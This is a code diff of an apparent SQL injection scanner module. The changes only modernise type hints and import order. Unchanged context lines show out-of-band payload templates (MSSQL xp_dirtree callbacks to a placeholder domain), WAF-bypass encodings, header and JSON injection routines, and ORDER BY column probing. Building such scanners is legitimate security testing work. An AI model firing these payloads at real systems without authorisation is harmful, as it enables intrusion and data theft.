@@ -16,18 +16,17 @@ import json
 import random
 import string
 import time
-from typing import Any, Dict, List, Optional, Tuple
+from typing import Any
 
-from titan.core.models import Finding, Severity, AttackType
+from titan.core.models import AttackType, Finding, Severity
 from titan.verify import BaselineAnalyzer, BlindDetector
 from titan.verify.oracles import is_echo_differential
-
 
 # ---------------------------------------------------------------------------
 # Error signatures — comprehensive across 10+ DB engines
 # Kept as a module-level tuple so _test_param source-inspection tests pass.
 # ---------------------------------------------------------------------------
-_SQLI_ERROR_SIGNATURES: Tuple[str, ...] = (
+_SQLI_ERROR_SIGNATURES: tuple[str, ...] = (
     # Generic / standards
     "sql syntax", "syntax error", "sqlstate", "database error", "query failed",
     "unclosed quotation mark", "quoted string not properly terminated", "conversion failed",
@@ -67,7 +66,7 @@ _SQLI_ERROR_SIGNATURES: Tuple[str, ...] = (
 )
 
 # HTTP headers that are commonly logged/stored as-is and executed raw SQL
-_INJECTABLE_HEADERS: Tuple[str, ...] = (
+_INJECTABLE_HEADERS: tuple[str, ...] = (
     "User-Agent",
     "X-Forwarded-For",
     "X-Real-IP",
@@ -84,7 +83,7 @@ _INJECTABLE_HEADERS: Tuple[str, ...] = (
 )
 
 # OOB payloads per DB dialect — placeholders replaced with a live domain
-_OOB_TEMPLATES: Dict[str, List[str]] = {
+_OOB_TEMPLATES: dict[str, list[str]] = {
     "mssql": [
         "'; EXEC master..xp_dirtree '//{domain}/a'--",
         "'; EXEC master..xp_fileexist '//{domain}/a'--",
@@ -119,11 +118,11 @@ class SQLiDetector:
 
     ERROR_SIGNATURES = _SQLI_ERROR_SIGNATURES
 
-    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
+    def __init__(self, payload_smith, fingerprint: dict[str, Any]):
         self.payload_smith = payload_smith
         self.fingerprint = fingerprint
         self.blind_detector = BlindDetector(samples=3, confidence=0.95)
-        self._oob_client: Optional[Any] = None
+        self._oob_client: Any | None = None
 
     # ------------------------------------------------------------------
     # PUBLIC ENTRY POINT
@@ -135,9 +134,9 @@ class SQLiDetector:
         target: str,
         method: str,
         url: str,
-        params: Dict[str, str],
-    ) -> List[Finding]:
-        findings: List[Finding] = []
+        params: dict[str, str],
+    ) -> list[Finding]:
+        findings: list[Finding] = []
 
         context_data = {
             "fingerprint": self.fingerprint,
@@ -218,7 +217,7 @@ class SQLiDetector:
     # ENGINE 5 — POLYMORPHIC WAF ENCODING SET
     # ------------------------------------------------------------------
 
-    def _build_waf_polymorphic_set(self) -> List[str]:
+    def _build_waf_polymorphic_set(self) -> list[str]:
         """
         Generate encoding-diversified variants that bypass rule-based WAFs:
           • MySQL versioned comments  /*!50000SELECT*/
@@ -226,7 +225,7 @@ class SQLiDetector:
           • String-concat avoidance  CONCAT(CHAR(…)) bypasses quote filters
           • HTTP Parameter Pollution id=1&id=' OR 1=1-- (for proxy-WAF bypass)
         """
-        payloads: List[str] = []
+        payloads: list[str] = []
 
         # MySQL versioned inline comments
         payloads.extend([
@@ -262,8 +261,8 @@ class SQLiDetector:
     # ------------------------------------------------------------------
 
     def _build_param_payload_suite(
-        self, param_name: str, param_val: str, generic_payloads: List[str]
-    ) -> List[str]:
+        self, param_name: str, param_val: str, generic_payloads: list[str]
+    ) -> list[str]:
         suite = list(generic_payloads)
 
         # Integer context: unquoted arithmetic + delay probes
@@ -318,16 +317,16 @@ class SQLiDetector:
         target: str,
         method: str,
         url: str,
-        params: Dict[str, str],
-        payloads: List[str],
-    ) -> List[Finding]:
+        params: dict[str, str],
+        payloads: list[str],
+    ) -> list[Finding]:
         """
         Many apps log raw headers straight into SQL without sanitization.
         Sends each payload in each high-risk header and applies the same
         differential oracles as param injection.
         """
-        findings: List[Finding] = []
-        safe_headers: Dict[str, str] = {"Referer": target}
+        findings: list[Finding] = []
+        safe_headers: dict[str, str] = {"Referer": target}
 
         # Baseline with clean headers
         try:
@@ -396,15 +395,15 @@ class SQLiDetector:
         target: str,
         method: str,
         url: str,
-        params: Dict[str, str],
-        payloads: List[str],
-    ) -> List[Finding]:
+        params: dict[str, str],
+        payloads: list[str],
+    ) -> list[Finding]:
         """
         Recursively traverses a JSON body and injects each payload into every
         leaf string node. Non-destructive: injects one leaf at a time and
         restores the original value before moving to the next leaf.
         """
-        findings: List[Finding] = []
+        findings: list[Finding] = []
         if method.upper() == "GET":
             return findings
 
@@ -485,7 +484,7 @@ class SQLiDetector:
 
         return findings
 
-    def _json_leaves(self, node: Any, path: Optional[list] = None):
+    def _json_leaves(self, node: Any, path: list | None = None):
         """Yield (path, value) for every string/int leaf in a nested JSON tree."""
         if path is None:
             path = []
@@ -515,14 +514,14 @@ class SQLiDetector:
         target: str,
         method: str,
         url: str,
-        params: Dict[str, str],
-    ) -> List[Finding]:
+        params: dict[str, str],
+    ) -> list[Finding]:
         """
         Send out-of-band payloads for async/background SQLi sinks.
         Fires dialect-specific DNS/HTTP callbacks via Interactsh and polls
         for a hit. If no Interactsh is configured, returns empty.
         """
-        findings: List[Finding] = []
+        findings: list[Finding] = []
         try:
             from titan.integrations.interactsh import InteractshClient
             client = InteractshClient()
@@ -593,15 +592,15 @@ class SQLiDetector:
         target: str,
         method: str,
         url: str,
-        params: Dict[str, str],
+        params: dict[str, str],
         seed_finding: Finding,
-    ) -> List[Finding]:
+    ) -> list[Finding]:
         """
         Binary search for the exact column count using ORDER BY, then
         type-probe which columns accept strings. Returns a precise UNION
         SELECT finding with a real column count, not a hardcoded guess.
         """
-        findings: List[Finding] = []
+        findings: list[Finding] = []
         param_name = seed_finding.param
         if param_name not in params:
             return findings
@@ -666,7 +665,7 @@ class SQLiDetector:
         context,
         url: str,
         method: str,
-        params: Dict[str, str],
+        params: dict[str, str],
         param_name: str,
     ) -> int:
         """
@@ -676,7 +675,7 @@ class SQLiDetector:
         lo, hi = 1, 64
 
         # Verify ORDER BY 1 succeeds and ORDER BY 65 fails (confirm injectable)
-        def _make_params(n: int) -> Dict[str, str]:
+        def _make_params(n: int) -> dict[str, str]:
             p = dict(params)
             p[param_name] = f"' ORDER BY {n}--"
             return p
@@ -722,16 +721,16 @@ class SQLiDetector:
         context,
         url: str,
         method: str,
-        params: Dict[str, str],
+        params: dict[str, str],
         param_name: str,
         col_count: int,
-    ) -> List[int]:
+    ) -> list[int]:
         """
         For each column index, replace its NULL with a quoted string marker.
         Columns that do not throw a type error are string-compatible.
         Returns list of zero-based string-accepting column indices.
         """
-        string_cols: List[int] = []
+        string_cols: list[int] = []
         marker = "COLPROBE"
 
         for i in range(col_count):
@@ -765,13 +764,13 @@ class SQLiDetector:
         method: str,
         url: str,
         param_name: str,
-        all_params: Dict[str, str],
-        payloads: List[str],
-    ) -> Optional[Finding]:
+        all_params: dict[str, str],
+        payloads: list[str],
+    ) -> Finding | None:
         try:
             baseline_body = ""
             baseline_status = None
-            baseline_times: List[float] = []
+            baseline_times: list[float] = []
 
             # 1. Collect Baseline
             try:
@@ -907,7 +906,7 @@ class SQLiDetector:
     # HELPERS
     # ------------------------------------------------------------------
 
-    def _get_opposite_payload(self, payload: str) -> Optional[str]:
+    def _get_opposite_payload(self, payload: str) -> str | None:
         """Generate the logical opposite for sanity-pair testing."""
         pl = payload.lower().replace("/**/", "")
         if "or 1=1" in pl or "or '1'='1" in pl:
